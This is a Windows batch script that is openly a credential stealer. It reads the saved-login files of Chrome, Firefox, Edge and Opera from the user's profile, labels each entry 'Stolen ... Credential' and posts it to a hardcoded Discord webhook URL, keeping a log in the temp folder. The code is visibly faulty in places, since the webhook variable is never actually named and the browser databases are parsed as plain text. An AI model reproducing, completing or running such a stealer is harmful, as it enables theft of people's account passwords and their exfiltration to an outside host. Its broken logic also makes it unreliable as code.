

@echo off
setlocal enabledelayedexpansion

set "https://discord.com/api/webhooks/1370565115954597908/fSU1Mm2Onc2doCcNM_6hBzhbVo_nGClkUQ0C1iNdbbKr09dBvEg_irn21b-BRdJoWgQQ"

REM Log file path
set "LOG_FILE=%TEMP%\webhook_log.txt"

REM Function to send a message to Discord
:sendToDiscord
powershell -Command "Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body '{\"content\": \"%~1\"}' -ContentType 'application/json'"
exit /b

REM Function to log messages
:logMessage
echo %~1 >> "%LOG_FILE%"
exit /b

REM Get Chrome credentials
for /f "tokens=*" %%i in ('powershell -Command "Get-Content 'C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data' | Select-String -Pattern 'origin_url','username_value','password_value' -Context 0,1 | ForEach-Object { $_.Context.PostContext[0] } | ForEach-Object { $_.Trim().Replace('origin_url":"', 'Website: ').Replace('username_value":"', ' - Username: ').Replace('password_value":"', ' - Password: ').Replace('"', '') }"') do (
    call :logMessage "Chrome: %%i"
    call :sendToDiscord "Stolen Chrome Credential: %%i"
)

REM Get Firefox credentials
for /f "tokens=*" %%i in ('powershell -Command "Get-Content 'C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json' | Select-String -Pattern 'hostname','encryptedUsername','encryptedPassword' -Context 0,1 | ForEach-Object { $_.Context.PostContext[0] } | ForEach-Object { $_.Trim().Replace('hostname":"', 'Website: ').Replace('encryptedUsername":"', ' - Username: ').Replace('encryptedPassword":"', ' - Password: ').Replace('"', '') }"') do (
    call :logMessage "Firefox: %%i"
    call :sendToDiscord "Stolen Firefox Credential: %%i"
)

REM Get Edge credentials
for /f "tokens=*" %%i in ('powershell -Command "Get-Content 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data' | Select-String -Pattern 'origin_url','username_value','password_value' -Context 0,1 | ForEach-Object { $_.Context.PostContext[0] } | ForEach-Object { $_.Trim().Replace('origin_url":"', 'Website: ').Replace('username_value":"', ' - Username: ').Replace('password_value":"', ' - Password: ').Replace('"', '') }"') do (
    call :logMessage "Edge: %%i"
    call :sendToDiscord "Stolen Edge Credential: %%i"
)

REM Get Opera credentials
for /f "tokens=*" %%i in ('powershell -Command "Get-Content 'C:\Users\%USERNAME%\AppData\Roaming\Opera Software\Opera Stable\Login Data' | Select-String -Pattern 'origin_url','username_value','password_value' -Context 0,1 | ForEach-Object { $_.Context.PostContext[0] } | ForEach-Object { $_.Trim().Replace('origin_url":"', 'Website: ').Replace('username_value":"', ' - Username: ').Replace('password_value":"', ' - Password: ').Replace('"', '') }"') do (
    call :logMessage "Opera: %%i"
    call :sendToDiscord "Stolen Opera Credential: %%i"
)
echo Credentials sent to Discord successfully.
call :logMessage "Credentials sent to Discord successfully."

endlocal